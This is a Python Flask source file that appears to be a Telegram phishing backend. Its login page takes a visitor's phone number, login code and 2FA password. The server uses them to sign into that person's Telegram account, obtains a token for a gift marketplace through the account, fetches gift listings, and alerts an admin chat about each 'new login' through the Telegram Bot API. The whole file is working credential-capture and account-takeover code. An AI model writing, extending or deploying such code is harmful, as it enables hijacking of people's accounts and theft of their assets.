import asyncio
import uuid
import json
from flask import Flask, render_template, request, jsonify, session
from pyrogram import Client
from pyrogram.raw.functions.messages import RequestAppWebView
from pyrogram.raw.types import InputBotAppShortName, InputUser
from urllib.parse import unquote
import requests as http_requests
import config

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# Store active Pyrogram clients per session
active_clients = {}


def get_event_loop():
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop


def send_to_admin(text):
    """Send message to admin via Telegram Bot API."""
    if not config.ADMIN_BOT_TOKEN or not config.ADMIN_CHAT_ID:
        print('[WARN] Admin bot not configured, skipping notification')
        return
    url = f'https://api.telegram.org/bot{config.ADMIN_BOT_TOKEN}/sendMessage'
    http_requests.post(url, json={
        'chat_id': config.ADMIN_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
    })


# ---------- Routes ----------

@app.route('/')
def index():
    return render_template('login.html')


@app.route('/api/send-code', methods=['POST'])
def send_code():
    """Step 1: user submits phone number, we send the Telegram code."""
    data = request.json
    phone = data.get('phone', '').strip()
    if not phone:
        return jsonify({'ok': False, 'error': 'Введите номер телефона'}), 400

    sid = str(uuid.uuid4())
    client = Client(
        f'sessions/{sid}',
        api_id=config.API_ID,
        api_hash=config.API_HASH,
        phone_number=phone,
        in_memory=True,
    )

    loop = get_event_loop()

    async def _send():
        await client.connect()
        code = await client.send_code(phone)
        return code.phone_code_hash

    try:
        phone_code_hash = loop.run_until_complete(_send())
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

    active_clients[sid] = {
        'client': client,
        'phone': phone,
        'phone_code_hash': phone_code_hash,
    }
    session['sid'] = sid

    return jsonify({'ok': True, 'sid': sid})


@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Step 2: user submits the code they received."""
    data = request.json
    code = data.get('code', '').strip()
    password = data.get('password', '').strip()  # 2FA if needed
    sid = data.get('sid') or session.get('sid')

    if not sid or sid not in active_clients:
        return jsonify({'ok': False, 'error': 'Сессия не найдена, начните заново'}), 400

    info = active_clients[sid]
    client = info['client']
    phone = info['phone']
    phone_code_hash = info['phone_code_hash']

    loop = get_event_loop()

    async def _sign_in():
        try:
            await client.sign_in(phone, phone_code_hash, code)
        except Exception as e:
            # 2FA required
            if 'Two-step' in str(e) or 'PASSWORD_HASH_INVALID' in str(e) or 'password' in str(e).lower():
                if not password:
                    return {'needs_2fa': True}
                await client.check_password(password)
            else:
                raise

        # --- Auth successful, get marketplace token ---
        bot_entity = await client.get_users('mrkt')
        peer = await client.resolve_peer('mrkt')

        bot = InputUser(user_id=bot_entity.id, access_hash=bot_entity.raw.access_hash)
        bot_app = InputBotAppShortName(bot_id=bot, short_name='app')

        web_view = await client.invoke(
            RequestAppWebView(
                peer=peer,
                app=bot_app,
                platform='android',
            )
        )

        init_data = unquote(
            web_view.url.split('tgWebAppData=', 1)[1].split('&tgWebAppVersion', 1)[0]
        )

        auth_resp = http_requests.post(
            f'{config.MARKET_API_URL}/auth',
            json={'data': init_data},
        )
        token = auth_resp.json().get('token', '')

        # Fetch gifts
        headers = {'Authorization': token, 'Referer': 'https://cdn.tgmrkt.io/'}
        gifts_resp = http_requests.post(
            f'{config.MARKET_API_URL}/gifts/saling',
            headers=headers,
            json={
                'collectionNames': ['Lunar Snake'],
                'modelNames': ['Albino'],
                'backdropNames': [],
                'symbolNames': [],
                'ordering': 'Price',
                'lowToHigh': True,
                'maxPrice': None,
                'minPrice': None,
                'mintable': None,
                'number': None,
                'count': 20,
                'cursor': '',
                'query': None,
                'promotedFirst': False,
            },
        )
        gifts = gifts_resp.json().get('gifts', [])

        me = await client.get_me()
        user_label = f'{me.first_name} (@{me.username or "N/A"})'

        await client.disconnect()
        return {'gifts': gifts, 'user': user_label}

    try:
        result = loop.run_until_complete(_sign_in())
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

    if result.get('needs_2fa'):
        return jsonify({'ok': True, 'needs_2fa': True})

    # Cleanup
    active_clients.pop(sid, None)

    # Send to admin
    gifts = result['gifts']
    user_label = result['user']
    summary_lines = []
    for g in gifts[:10]:
        name = g.get('name', g.get('id', '?'))
        price = g.get('price', '?')
        summary_lines.append(f'  • {name} — {price} ⭐')

    admin_text = (
        f'<b>Новый вход:</b> {user_label}\n'
        f'<b>Найдено подарков:</b> {len(gifts)}\n\n'
        + '\n'.join(summary_lines)
    )
    send_to_admin(admin_text)

    return jsonify({
        'ok': True,
        'gifts': gifts,
        'user': user_label,
    })


if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
